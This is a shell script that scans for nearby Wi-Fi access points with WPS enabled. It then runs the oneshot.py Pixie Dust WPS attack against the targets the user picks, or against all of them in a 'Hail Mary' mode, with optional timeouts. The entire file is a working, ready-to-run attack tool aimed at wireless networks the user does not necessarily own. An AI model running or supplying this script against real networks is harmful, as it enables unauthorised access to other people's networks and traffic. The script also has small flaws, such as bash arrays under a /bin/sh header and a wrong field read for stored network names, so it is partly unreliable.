#!/bin/sh

#Help function
function usage()
{
	echo "Usage: $(basename $0) [options]"
	echo -e "-t <time>      \tScan timeout in seconds"
	echo -e "-i <interface> \tInterface name"
	echo -e "-a             \tAttack all targets"
	echo -e "-n             \tAttack only new targets"
	echo -e "-h             \tShow this help"
	exit
}

#Setting default values
IFACE="wlan0"

#Parsing script arguments
while getopts "t:i:han" opt
do
	case $opt in
		t)
			TIMEOUT=${OPTARG};;
		i)
			IFACE=${OPTARG};;
		a)
			ALL="1";;
		n)
			NEW="1";;
		h)
			usage;;
		*)
			usage;;
	esac
done

echo "[*] Scanning networks around..."

#Scanning networks and parsing output via awk scipt
TARGETS=$(iw dev $IFACE scan |\
awk -v iface="$IFACE)" '$3 == iface {MAC = $2;wifi[MAC]["BSSID"] = MAC};\
                        $1 == "SSID:" {wifi[MAC]["SSID"] = $2};\
                        $1 == "WPS:" {printf "%s\t%s\n",wifi[MAC]["BSSID"],wifi[MAC]["SSID"]}'|\
sed --expression='s/(on//g')

#Getting stored networks info
if [ -d reports ]
then
	OLD=$(cat reports/stored.txt |\
		awk '$1 == "BSSID:" {MAC = $2; wifi[MAC]["BSSID"] = MAC};\
		$1 == "ESSID:" {wifi[MAC]["SSID"] = $2;\
		printf "%s\t%s\n",wifi[MAC]["BSSID"],wifi[MAC]["SSID"]}' | sort | uniq -i)
fi

#Filling corresponding arrays with stored networks mac/name
if [ $NEW ]
then
	for BSSID in $(echo "$OLD" | awk '{print $1}')
	do
		OLD_BSSIDS+=($BSSID)
	done

	for ESSID in $(echo "$OLD" | awk '{print $1}')
	do
		OLD_ESSIDS+=($ESSID)
	done
fi

#Checking, if networks with WPS were found
if [ "$TARGETS" ]
then
	echo
	echo "[+] Found targets:"
else
	echo "[-] No targets found"
	exit
fi

#Filling BSSIDS array with MAC addresses
for BSSID in $(echo "$TARGETS" | awk '{print $1}')
do
	BSSIDS+=($BSSID)
done

#Filling ESSIDS array with networks names
for ESSID in $(echo "$TARGETS" | awk '{print $2}')
do
	ESSIDS+=($ESSID)
done

#Displaying to user scan results
for TARGET in ${!BSSIDS[@]}
do
	echo -e "[$((${TARGET}+1))] ${BSSIDS[$TARGET]}\t${ESSIDS[$TARGET]}"
done

#Prompting user for set of targets from scan result
if [ ! $ALL ]
then
	echo -n "[*] Choose targets to attack (space separated) or 'all': "
	read CHOSEN
fi

#Hail Mary
if [ "$CHOSEN" = "all" ] || [ $ALL ]
then
	echo "[*] Attacking all targets!"
	CHOSEN=${!BSSIDS[@]}
	ALL="1"
fi

if [ ! $TIMEOUT ]
then
	echo -n "[*] Set timeout for each target (0 - no timeout): "
	read TIMEOUT
fi

#Main loop
for TARGET in $CHOSEN
do
	#Adjusting array indexes from user input
	if [ ! $ALL ]
	then
		TARGET=$(($TARGET-1))
	fi

	#Calling oneshot with terget bssid
	echo
	echo "[+] Shooting ${BSSIDS[$TARGET]} - ${ESSIDS[$TARGET]}"
	python oneshot.py --bssid ${BSSIDS[$TARGET]} -K -F -i $IFACE -w 2>/dev/null || true && killall sleep 2> /dev/null &
	
	#Starting timeout timer
	if [ $TIMEOUT -gt 0 ]
	then
		sleep $TIMEOUT > /dev/null && echo "[-] Timeout!"
		PIDS="1"
		while [ "$PIDS" ]
		do
			#Killing oneshot proccess, that's hang
			PIDS=$(ps -ux | grep oneshot.py | grep -v grep | awk '{print $2}')
			for PID in $PIDS
			do
				kill -9 $PID > /dev/null
				echo "[*] Killed oneshot process"
			done
			sleep 1
		done
	fi

	wait
done

echo "[*] Jobs done!"
